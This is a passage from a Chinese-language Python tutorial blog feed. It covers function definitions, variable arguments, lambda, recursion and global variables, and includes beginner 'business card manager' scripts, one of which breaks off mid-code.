class="line"></span><br><span class="line">def sign_out():</span><br><span class="line">    print(&apos;感谢使用本系统，再见！&apos;)</span><br><span class="line"></span><br><span class="line">def del_card():</span><br><span class="line">    mun = int(input(&apos;请再次输入数字1确认删数据库：&apos;))</span><br><span class="line">    if mun == 1:</span><br><span class="line">        card_list.clear()</span><br><span class="line">        print(&apos;已删除数据库，系统已自动报警，谁也跑不了！&apos;)</span><br><span class="line"></span><br><span class="line">def find_name(card_list):</span><br><span class="line">    find_name = input(&apos;请输入你要查询的名片：&apos;)</span><br><span class="line">    find_flag = 1</span><br><span class="line">    for all_card in card_list:</span><br><span class="line">        if find_name == all_card[&apos;name&apos;]:</span><br><span class="line">            print(&apos;%s\t%s\t%s\t%s&apos;%(all_card[&apos;name&apos;],all_card[&apos;contact&apos;],all_card[&apos;phone&apos;],all_card[&apos;address&apos;]))</span><br><span class="line">            find_flag = 0</span><br><span class="line"></span><br><span class="line">            if find_flag == 1:</span><br><span class="line">                print(&apos;该名片不存在！&apos;)</span><br><span class="line"></span><br><span class="line">def del_name(card_list):</span><br><span class="line">    del_name = input(&apos;请输入你要删除的名字：&apos;)</span><br><span class="line">    x = -1</span><br><span class="line">    for all_card in card_list:</span><br><span class="line">        x += 1</span><br><span class="line">        if del_name == all_card[&apos;name&apos;]:</span><br><span class="line">            del card_list[x]</span><br><span class="line">            print(&quot;名片已删除&quot;)</span><br><span class="line"></span><br><span class="line">def edit_name(card_list):</span><br><span class="line">    edit_name = input(&apos;请输入你要修改的名字：&apos;)</span><br><span class="line">    x = -1</span><br><span class="line">    for all_card in card_list:</span><br><span class="line">        x += 1</span><br><span class="line">        if edit_name == all_card[&apos;name&apos;]:</span><br><span class="line">            card_list[x] = input_card()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    menu()</span><br><span class="line">    while True:</span><br><span class="line">        mun = input(&apos;请输入功能序号：&apos;)</span><br><span class="line">        if mun.isdigit():</span><br><span class="line">            mun = int(mun)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;请输入正确的功能序号！&apos;)</span><br><span class="line"></span><br><span class="line">        if mun == 1:</span><br><span class="line">            card_list.append(input_card())</span><br><span class="line">        if mun == 2:</span><br><span class="line">            del_name(card_list)</span><br><span class="line">        if mun == 3:</span><br><span class="line">            edit_name(card_list)</span><br><span class="line">        if mun == 4:</span><br><span class="line">            find_name(card_list)</span><br><span class="line">        if mun == 5:</span><br><span class="line">            see_card(card_list)</span><br><span class="line">        if mun == 6:</span><br><span class="line">            sign_out()</span><br><span class="line">            break</span><br><span class="line">        if mun == 7:</span><br><span class="line">            del_card()</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    card_list = []</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 定义函数</title>
      <link href="/article/python-function.html"/>
      <url>/article/python-function.html</url>
      
        <content type="html"><![CDATA[<h3 id="内置函数："><a href="#内置函数：" class="headerlink" title="内置函数："></a>内置函数：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">len()统计长度</span><br><span class="line">dir()查看对象的内置函数</span><br><span class="line">max()最大数</span><br><span class="line">min()最小数</span><br></pre></td></tr></table></figure><p>传入参数为实参，接收参数为形参。</p><h3 id="创建函数："><a href="#创建函数：" class="headerlink" title="创建函数："></a>创建函数：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def test():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    这里是说明之类的东西</span><br><span class="line">    hello word!.doc</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return</span><br><span class="line">print test.__doc__</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line"> </span><br><span class="line">list = [1,2,3,44,5,6,7,88]</span><br><span class="line">def test(lists): #参数任意写</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    这里是说明之类的东西</span><br><span class="line">    hello word!.doc</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    lists.sort() #进行排序</span><br><span class="line">    return lists[-1] #实现MAX功能</span><br><span class="line">print test(list) #list代替lists</span><br></pre></td></tr></table></figure><h3 id="传入参数"><a href="#传入参数" class="headerlink" title="传入参数"></a>传入参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def sum_2_nums(a, b):</span><br><span class="line">    result = a+b</span><br><span class="line">    print(&quot;%d+%d=%d&quot;%(a,b,result))</span><br><span class="line"></span><br><span class="line">num1 = int(input(&quot;请输入第1个数字:&quot;))</span><br><span class="line">num2 = int(input(&quot;请输入第2个数字:&quot;))</span><br><span class="line"></span><br><span class="line">#调用函数</span><br><span class="line">sum_2_nums(num1, num2)</span><br></pre></td></tr></table></figure><h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><h3 id="列表-两个必须同时使用，需要元组在前边"><a href="#列表-两个必须同时使用，需要元组在前边" class="headerlink" title="列表 两个必须同时使用，需要元组在前边"></a>列表 两个必须同时使用，需要元组在前边</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line"> </span><br><span class="line">def test(*lists): #返回一个元组</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    这里是说明之类的东西</span><br><span class="line">    hello word!.doc</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return lists</span><br><span class="line">print test(1,2,3,44,&quot;ca&quot;,5,6,7,88) #list代替lists</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line"> </span><br><span class="line">def test(*lists,**list): #返回一个元组</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    这里是说明之类的东西</span><br><span class="line">    hello word!.doc</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return lists,list</span><br><span class="line">print test(1,2,3,4,a=1,b=2,c=3) #list代替lists</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line">def test(x,y,*lists,**list): #返回一个元组</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    这里是说明之类的东西</span><br><span class="line">    hello word!.doc</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return x,y,lists,list</span><br><span class="line">print test(123,456,1,2,3,4,a=1,b=2,c=3) #list代替lists</span><br></pre></td></tr></table></figure><h3 id="位置参数必须放在前面："><a href="#位置参数必须放在前面：" class="headerlink" title="位置参数必须放在前面："></a>位置参数必须放在前面：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line"> </span><br><span class="line">def test(x,y,*lists,**list): #返回一个元组</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    这里是说明之类的东西</span><br><span class="line">    hello word!.doc</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return x,y,lists,list</span><br><span class="line">print test(123,456,1,2,3,4,a=1,b=2,c=3) #list代替lists</span><br></pre></td></tr></table></figure><h3 id="列表内多个数值相加："><a href="#列表内多个数值相加：" class="headerlink" title="列表内多个数值相加："></a>列表内多个数值相加：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line"> </span><br><span class="line">def test(*sum): #返回一个元组</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    这里是说明之类的东西</span><br><span class="line">    hello word!.doc</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    x = 0</span><br><span class="line">    for list in sum:</span><br><span class="line">        x += list</span><br><span class="line">    return x</span><br><span class="line">print test(1,2,3,4,5,6,7,8,9) #list代替lists</span><br></pre></td></tr></table></figure><h3 id="内置方法："><a href="#内置方法：" class="headerlink" title="内置方法："></a>内置方法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = (1,2,3,4,5,6,7,8,9)</span><br><span class="line">print sum(x)</span><br></pre></td></tr></table></figure><h3 id="判断输入的类型："><a href="#判断输入的类型：" class="headerlink" title="判断输入的类型："></a>判断输入的类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line"> </span><br><span class="line">def test(*sum): #返回一个元组</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    这里是说明之类的东西</span><br><span class="line">    hello word!.doc</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if isinstance(sum,int): #判断sum是否为整型</span><br><span class="line">        x = 0</span><br><span class="line">        for list in sum:</span><br><span class="line">            x += list</span><br><span class="line">        return x</span><br><span class="line">    else:</span><br><span class="line">        return &quot;False int&quot;</span><br><span class="line">print test(1,2,3,4,5,6,7,8,9) #list代替lists</span><br></pre></td></tr></table></figure><h3 id="断言：assert"><a href="#断言：assert" class="headerlink" title="断言：assert"></a>断言：assert</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print assert test(1,2,3,4,5,6,7,8,9) == int,&quot;条件不成立的断言说明&quot;</span><br></pre></td></tr></table></figure><p>进行基本的测试和判断，断言函数返回的结果，是否是我们想要的，如果不是，则程序会跑出一个异常错误。</p><h3 id="函数cmp-比较两个值的大小："><a href="#函数cmp-比较两个值的大小：" class="headerlink" title="函数cmp()比较两个值的大小："></a>函数cmp()比较两个值的大小：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = 3</span><br><span class="line">b = 2</span><br><span class="line">print cmp(a,b)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a = 3</span><br><span class="line">b = 2</span><br><span class="line"> </span><br><span class="line">def compare(a,b):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    compare doc.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if a == b:</span><br><span class="line">        return 0</span><br><span class="line">    elif a &gt; b:</span><br><span class="line">        return 1</span><br><span class="line">    else :</span><br><span class="line">        return -1</span><br><span class="line">print compare(a,b)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = 3</span><br><span class="line">b = 2</span><br><span class="line"> </span><br><span class="line">def compare(a,b):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    compare doc.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if a == b:</span><br><span class="line">        return 0</span><br><span class="line">    elif a &gt; b:</span><br><span class="line">        return 1</span><br><span class="line">    else :</span><br><span class="line">        return -1</span><br><span class="line">print compare.__code__ #查看代码开始的行数</span><br><span class="line">print dir(compare.__code__) #查看compare.__code__内置方法</span><br><span class="line">print compare.__code__.co_filename #查看代码引用的文件名</span><br></pre></td></tr></table></figure><h3 id="lambda："><a href="#lambda：" class="headerlink" title="lambda："></a>lambda：</h3><p>是一个表达式，而不是一个Python语句，他可以出现在我们不方便使用def函数的场合。<br>简单任务用lambda，复杂任务用def。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def test(x):</span><br><span class="line">    return x + 1</span><br><span class="line">print test(1)</span><br><span class="line">content = lambda x: x+1 #lambda声明+空格+参数冒号分割+表达式</span><br><span class="line">print content(1)</span><br></pre></td></tr></table></figure><h3 id="三元表达式："><a href="#三元表达式：" class="headerlink" title="三元表达式："></a>三元表达式：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a if a &gt; b else b #三元表达式</span><br><span class="line">compare = lambda a,b: a if a &gt; b else b</span><br><span class="line">print compare(a,b)</span><br></pre></td></tr></table></figure><h3 id="filter：过滤器"><a href="#filter：过滤器" class="headerlink" title="filter：过滤器"></a>filter：过滤器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content = [&quot;520&quot;,&quot;hello&quot;,&quot;word&quot;,&quot;!&quot;]</span><br><span class="line">test = filter(lambda x:x.isalnum(),content) #isalnum() 所有字符都是数字或者字母</span><br><span class="line">print test</span><br></pre></td></tr></table></figure><h3 id="递归：调用函数的本身。"><a href="#递归：调用函数的本身。" class="headerlink" title="递归：调用函数的本身。"></a>递归：调用函数的本身。</h3><h3 id="阶乘：factorial"><a href="#阶乘：factorial" class="headerlink" title="阶乘：factorial"></a>阶乘：factorial</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def factorial(n):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    factorial doc.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if n == 1:</span><br><span class="line">        return 1 # 1的阶乘是1</span><br><span class="line">    else:</span><br><span class="line">        return n * factorial(n-1) # 大于1的的数的阶乘是n * n-1的阶乘</span><br><span class="line">print factorial(5)</span><br></pre></td></tr></table></figure><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#定义一个全局变量,wendu</span><br><span class="line">wendu = 0</span><br><span class="line"></span><br><span class="line">def get_wendu():</span><br><span class="line">    #如果wendu这个变量已经在全局变量的位置定义了,此时还想在函数中对这个全局变量进行修改的话</span><br><span class="line">    #那么 仅仅是 wendu=一个值  这还不够,此时wendu这个变量是一个局部变量,仅仅是和全局变量的名字</span><br><span class="line">    #相同罢了</span><br><span class="line">    #wendu = 33</span><br><span class="line">    </span><br><span class="line">    #使用global用来对一个全局变量的声明,那么这个函数中的wendu=33就不是定义一个局部变量,而是</span><br><span class="line">    #对全局变量进行修改</span><br><span class="line">    global wendu</span><br><span class="line">    wendu = 33</span><br><span class="line"></span><br><span class="line">def print_wendu():</span><br><span class="line">    print(&quot;温度是%d&quot;%wendu)</span><br><span class="line"></span><br><span class="line">get_wendu()</span><br><span class="line">print_wendu()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a = 100</span><br><span class="line">#建议</span><br><span class="line">g_a = 100</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    a = 200#在函数中 如果对一个和全局变量名相同的变量进行=value的时候,默认是定义一个变量</span><br><span class="line">            #只不过这个变量的名字和全局变量的名字相同罢了</span><br><span class="line">            #</span><br><span class="line">            #如果想在执行a=value时,不是定义局部变量,而是对全局变量修改,那么可以添加global进行声明</span><br><span class="line">    print(&quot;a=%d&quot;%a)</span><br><span class="line"></span><br><span class="line">def test2():</span><br><span class="line">    print(&quot;a=%d&quot;%a)#如果这里打印了100就声明了test函数没有对全局变量修改,而是定义了一个局部变量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line">test2()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nums = [11,22,33]</span><br><span class="line">infor = &#123;&quot;name&quot;:&quot;laowang&quot;&#125;</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    #for num in nums:</span><br><span class="line">    #    print(num)</span><br><span class="line"></span><br><span class="line">    nums.append(44)</span><br><span class="line">    infor[&apos;age&apos;] = 18</span><br><span class="line"></span><br><span class="line">def test2():</span><br><span class="line">    print(nums)</span><br><span class="line">    print(infor)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line">test2()</span><br></pre></td></tr></table></figure><h3 id="缺省参数"><a href="#缺省参数" class="headerlink" title="缺省参数"></a>缺省参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def test(a,d,b=22,c=33):</span><br><span class="line">    print(a)</span><br><span class="line">    print(b)</span><br><span class="line">    print(c)</span><br><span class="line">    print(d)</span><br><span class="line"></span><br><span class="line">test(d=11,a=22,c=44)</span><br></pre></td></tr></table></figure><h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def test(a,b,c=33,*args,**kwargs):#在定义的时候 *,**用来表示后面的变量有特殊功能</span><br><span class="line">    print(a)</span><br><span class="line">    print(b)</span><br><span class="line">    print(c)</span><br><span class="line">    print(args)</span><br><span class="line">    print(kwargs)</span><br><span class="line">    sum = a + b +c </span><br><span class="line">    for mun in args:</span><br><span class="line">        sum += mun</span><br><span class="line">        print(sum)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#test(11,22,33,44,55,66,77,task=99,done=89)</span><br><span class="line"></span><br><span class="line">A = (44,55,66)</span><br><span class="line">B = &#123;&quot;name&quot;:&quot;laowang&quot;,&quot;age&quot;:18&#125;</span><br><span class="line"></span><br><span class="line">test(11,22,33,*A,**B)#在实参中*,**表示对元祖/字典进行拆包</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 字典列表嵌套加标记实现名片管理</title>
      <link href="/article/python-dist-list-application.html"/>
      <url>/article/python-dist-list-application.html</url>
      
        <content type="html"><![CDATA[<p>实现功能：<br>获取用户输入的值：</p><ul><li><input disabled type="checkbox"> 添加到字典中，并把字典添加到列表中</li><li><input disabled type="checkbox"> 把字典迭代出来对比，通过标记的方式，判断获取的值是否在字典中</li><li><input disabled type="checkbox"> 把字典迭代出来，取对应值</li><li><input disabled type="checkbox"> 清空字典</li><li><input disabled type="checkbox"> 通过脚标方式，删除和编辑列表中的字典</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">print (&apos;名片管理系统 1.0&apos;)</span><br><span class="line">print (&apos;功能菜单：&apos;)</span><br><span class="line">print (&apos;1.添加一个名片&apos;)</span><br><span class="line">print (&apos;2.删除一个名片&apos;)</span><br><span class="line">print (&apos;3.修改一个名片&apos;)</span><br><span class="line">print (&apos;4.查询一个名片&apos;)</span><br><span class="line">print (&apos;5.列出所有名片&apos;)</span><br><span class="line">print (&apos;6.退出系统&apos;)</span><br><span class="line">print (&apos;7.删库跑路&apos;)</span><br><span class="line"></span><br><span class="line">card_list = []</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    mun = input(&apos;请输入功能序号：&apos;)</span><br><span class="line">    #判断用户输入是否是数字</span><br><span class="line">    if mun.isdigit():</span><br><span class="line">        mun = int(mun)</span><br><span class="line"></span><br><span class="line">    if mun == 1:</span><br><span class="line">        #获取用户输入的名片信息，并赋值</span><br><span class="line">        name = input(&apos;请输入姓名：&apos;)</span><br><span class="line">        contact = input(&apos;请输入微信：&apos;)</span><br><span class="line">        phone = input(&apos;请输入电话：&apos;)</span><br><span class="line">        address = input(&apos;请输入地址：&apos;)</span><br><span class="line">        #将获取的名片信息添加到字典中</span><br><span class="line">        card = &#123;&#125;</span><br><span class="line">        card[&apos;name&apos;] = name</span><br><span class="line">        card[&apos;contact&apos;] = contact</span><br><span class="line">        card[&apos;phone&apos;] = phone</span><br><span class="line">        card[&apos;address&apos;] = address</span><br><span class="line">        #把字典添加到列表中</span><br><span class="line">        card_list.append(card)</span><br><span class="line">        # print(card_list)</span><br><span class="line"></span><br><span class="line">    elif mun == 2:</span><br><span class="line">        del_name = input(&apos;请输入你要删除的名字：&apos;)</span><br><span class="line">        x = -1</span><br><span class="line">        for all_card in card_list:</span><br><span class="line">            #每迭代一个字典x+1,第一个字典位置加1后刚好为0</span><br><span class="line">            x += 1</span><br><span class="line">            if del_name == all_card[&apos;name&apos;]:</span><br><span class="line">                del card_list[x]</span><br><span class="line">                print(&quot;名片已删除&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    elif mun == 3:</span><br><span class="line">        edit_name = input(&apos;请输入你要修改的名字：&apos;)</span><br><span class="line">        x = -1</span><br><span class="line">        for all_card in card_list:</span><br><span class="line">            #每迭代一个字典x+1,第一个字典位置加1后刚好为0</span><br><span class="line">            x += 1</span><br><span class="line">            if edit_name == all_card[&apos;name&apos;]:</span><br><span class="line">                name = input(&apos;请输入新的姓名：&apos;)</span><br><span class="line">                contact = input(&apos;请输新的入微信：&apos;)</span><br><span class="line">                phone = input(&apos;请输入新的电话：&apos;)</span><br><span class="line">                address = input(&apos;请输入新的地址：&apos;)</span><br><span class="line">                card = &#123;&#125;</span><br><span class="line">                card[&apos;name&apos;] = name</span><br><span class="line">                card[&apos;contact&apos;] = contact</span><br><span class="line">                card[&apos;phone&apos;] = phone</span><br><span class="line">                card[&apos;address&apos;] = address</span><br><span class="line">                card_list[x] = card</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    elif mun == 4:</span><br><span class="line">        find_name = input(&apos;请输入你要查询的名片：&apos;)</span><br><span class="line">        #做一个标记，表示没有找到，0表示找到，这只是一个标记</span><br><span class="line">        find_flag = 1</span><br><span class="line">        